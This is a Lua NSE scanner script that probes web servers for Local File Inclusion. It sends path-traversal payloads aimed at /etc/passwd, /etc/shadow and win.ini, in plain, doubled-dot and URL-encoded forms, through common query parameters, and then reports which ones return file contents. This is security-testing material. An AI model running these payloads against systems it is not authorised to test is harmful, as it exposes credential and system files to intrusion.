local http = require "http"
local stdnse = require "stdnse"

description = [[Tests for Local File Inclusion by requesting common path traversal patterns and checking for file content in responses.]]
author = "HackIT Framework"
license = "HackIT Framework — Internal Use Only"
categories = {"web", "safe"}

portrule = function(host, port) return port.protocol == "tcp" and port.state == "open" end

action = function(host, port)
    local payloads = {
        {"../../../../etc/passwd", "root:.*:0:0:"},
        {"..\\..\\..\\..\\windows\\win.ini", "\\[fonts\\]"},
        {"....//....//....//etc/passwd", "root:.*:0:0:"},
        {"../../../../etc/shadow", "root:.*:"},
        {"..%2f..%2f..%2f..%2fetc/passwd", "root:.*:0:0:"},
    }
    local test_params = {"file", "page", "path", "include", "template", "doc", "folder"}
    local results = {}
    for _, param in ipairs(test_params) do
        for _, payload in ipairs(payloads) do
            local url = "/?" .. param .. "=" .. payload[1]
            local response = http.get(host, port, url)
            if response and response.body then
                if response.body:find(payload[2]) then
                    results[#results + 1] = "LFI via " .. param .. ": " .. payload[1]
                    break
                end
            end
        end
        if #results >= 3 then break end
    end
    if #results == 0 then
        return stdnse.format_output(false, "No LFI detected")
    end
    return stdnse.format_output(true, table.concat(results, "\n"))
end
